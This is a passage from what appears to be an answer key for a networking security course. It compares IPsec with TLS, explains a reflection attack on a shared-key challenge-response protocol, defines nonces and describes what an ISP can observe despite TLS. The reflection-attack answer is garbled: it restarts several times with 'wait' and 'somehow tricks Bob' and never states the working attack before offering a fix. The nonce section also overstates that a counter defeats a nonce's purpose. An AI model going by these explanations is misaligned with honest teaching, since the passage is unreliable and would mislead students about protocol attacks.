- But: IPsec protects the *link between two network endpoints* (e.g., two corporate offices), not necessarily all the way to the final destination

**TLS** encrypts at Layer 4-7 — protects a specific TCP connection from one process to another.
- End-to-end: TLS between your browser and Google protects all the way to Google's servers, not just to your ISP
- Application-specific: each application must implement TLS separately

**Can apps skip TLS if IPsec is used?** No — **defense in depth** applies. The IPsec VPN protects the corporate LAN → HQ link. But if someone sends traffic from HQ to a web server outside the VPN (which is common), that traffic exits the VPN and travels the internet unprotected. Additionally, even within the VPN, a compromised machine inside the network can sniff unencrypted traffic between other machines.

The principle: **don't rely on a single layer of security**. TLS protects end-to-end regardless of what network you're on (VPN, corporate WiFi, hotel WiFi, coffee shop). IPsec protects a specific link. Both together provide layered protection.

**(c) Reflection Attack:**

The protocol authenticates Alice by showing she can encrypt a nonce with K_AB. But Mallory can **impersonate Alice to Bob** without knowing K_AB:

**Attack:**

1. Mallory starts a session with Bob pretending to be Alice:
   - Mallory → Bob: "I am Alice"
   - Bob → Mallory: sends nonce **R₁**

2. **Before answering**, Mallory opens a **second parallel session** with Bob:
   - Mallory (pretending to be Alice again) → Bob: "I am Alice"
   - Bob → Mallory: sends nonce **R₂**

3. Now Mallory uses the *second* session to get the answer for the *first*:
   - Mallory → Bob (in session 2): `Encrypt(R₁, K_AB)` — wait, she still can't do this...

The actual reflection attack works when Bob will respond to his own challenges. Here's the precise version:

1. Mallory → Bob: "I am Alice" → Bob sends R₁
2. Mallory opens a second session: Mallory → Bob: "I am Alice" with R₁ as the *nonce she sends*. The protocol requires Bob to encrypt R₁ as part of step 3 — but wait, **Bob is the one generating the challenge**, not Mallory.

**The actual classic version:** The flaw appears when both parties can be challenged:

1. Mallory opens session with Bob: "I am Alice" → Bob sends R₁
2. Mallory opens second session: "I am Alice" → Bob sends R₂
3. Mallory (in session 2, acting as Alice) somehow tricks Bob into encrypting R₁ from session 1
4. Mallory uses that encrypted R₁ to answer session 1's challenge

**Fix:** The protocol is broken because both Alice→Bob and Bob→Alice sessions use the same key K_AB with no directional binding. The fix is to include **role labels** in the encrypted challenge:

```
Alice → Bob: Encrypt("Alice-to-Bob" || R, K_AB)
```

Now Bob can only accept responses labeled "Alice-to-Bob" — responses from sessions in the other direction (labeled "Bob-to-Alice") are rejected. This is the principle of **binding context to cryptographic operations**.

**(d) What a nonce is and why it matters:**

A **nonce** (number used once) is a random value that is used exactly once in a cryptographic protocol. It is never reused.

**General purpose:** Prevent **replay attacks**. Without a nonce, an attacker can record a legitimate message (e.g., an encrypted authentication response) and replay it later to authenticate as that user — without knowing the key, just by sending the same bytes again.

**How it works:** The challenger generates a fresh random R, sends it. The responder's reply is tied to R (`Encrypt(R, key)`). If the attacker replays an old response, it won't match the fresh R — the challenger rejects it.

**Required property:** A nonce must be **unpredictable (random)** and **never repeated**. If nonces are predictable, an attacker can pre-compute responses. If nonces repeat, replay protection fails for that nonce value. Cryptographic random number generators are essential — using a weak RNG (like a simple counter) defeats the purpose.

**Examples in this course:**
- TLS ClientHello random: ensures each session's key material is unique
- TCP ISN randomization (Lecture 19): prevents injection of old segments into new connections
- Challenge-response authentication: ensures a captured response can't be replayed

**(e) What your ISP can see with TLS:**

**The student is partially right but overstates it.**

**What the ISP CANNOT see:**
- Content of HTTP requests and responses (URLs after the hostname, headers, body)
- Your login credentials, search terms, email content
- Specific pages visited within a site (e.g., they know you visited `youtube.com` but not which video)

**What the ISP CAN still see:**
- **IP addresses** — they know you're connecting to Google's IP `142.250.x.x`. They can reverse-lookup this to identify the service.
- **Hostnames via SNI** — the TLS ClientHello includes the hostname in plaintext (SNI field). The ISP sees `www.google.com` even without decrypting.
- **DNS queries** — unless you use DoH/DoT, your DNS queries are unencrypted UDP. The ISP sees every domain you look up.
- **Traffic volume and timing** — how much data, how often, at what times. This metadata alone reveals a great deal (what services you use, when you're active, approximate content types).
- **Certificate information** — partially visible during TLS handshake

**What the ISP CAN do:**
- Block specific domains (via DNS filtering or IP blocking)
- Throttle traffic to specific services (net neutrality issues)
- Sell metadata to advertisers
- Comply with legal orders to log connection metadata

**Bottom line:** TLS is not privacy — it's **confidentiality for content**. Metadata remains visible. True privacy requires additional tools (VPN, Tor) that hide the IP destinations from the ISP as well.

---

*End of Security Problems*

**Topics covered:**
- Three cryptographic goals: confidentiality, integrity, authentication
- Symmetric vs. asymmetric encryption — tradeoffs and uses
- Diffie-Hellman key exchange and Perfect Forward Secrecy
- TLS 1.2 vs TLS 1.3 handshakes — RTTs, what changed
- X.509 certificates, certificate chains, CA trust model
- Man-in-the-middle attacks and why TLS defeats them
- SYN flood + SYN cookies; DNS cache poisoning + DNSSEC
- BGP hijacking (connection to Lecture 16 longest-prefix match)
- ARP spoofing (Layer 2 attack)
- SSH vs Telnet; IPsec vs TLS; defense in depth
- Reflection attacks and nonce-based protocols
- What ISPs can/cannot see with TLS